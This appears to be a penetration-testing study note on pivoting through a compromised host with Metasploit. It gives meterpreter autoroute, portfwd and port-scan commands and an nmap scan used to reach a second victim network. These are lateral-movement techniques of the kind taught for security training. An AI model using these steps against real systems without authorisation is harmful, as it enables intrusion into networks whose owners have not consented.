
## Pivoting

_Pivoting is the unique technique of using an instance (also referred to as a ‘plant’ or ‘foothold’) to be able to move around inside a network. Basically using the first compromise to allow and even aid in the compromise of other otherwise inaccessible systems._ 

[_https://www.offensive-security.com/metasploit-unleashed/pivoting/_](https://www.offensive-security.com/metasploit-unleashed/pivoting/)

#### _Port forwarding_

_Is the process of redirecting traffic from a specific port on the target system to a specific port on your system._

_\-Exploit the system which is connected to both the 1st (system victim1) and 2nd network._

_\-To scan for other systems open ports and services on the 2nd network, the scan must be made from the system victim 1._ 

 _Using meterpreter_

```plaintext
 ipconfig
 <ipv4 10.0.29.148>
 <ipv4 netmask 255.255.240.0>
```

From ipv4 address and Netmask we can determine the size of the network

Add a route which will allow us to acces victim system 2 from victism system 1

```plaintext
run autoroute -s 10.0.29.0/20
run autoroute -p
```

put meterpreter session in background

```plaintext
background
```

To scan the victim 2 system we will utilize metasploit module scanner/portscan/tcp

```plaintext
set RHOSTS
set PORTS
```

Enumearate service version running on a specific port on victim 2 system.

For this, we will use port forwarding.

Go back to the session

```plaintext
sessions
sessions 1
```

we should be in meterpreter session 1

```plaintext
portfwd add -l 1234 -p 80 -r <ip address of victim system 2>
```

open a new tab in your kali linux machine. 

```plaintext
nmap -sV -p 1234 localhost
```

Now we know what services are running on victim 2

\_20
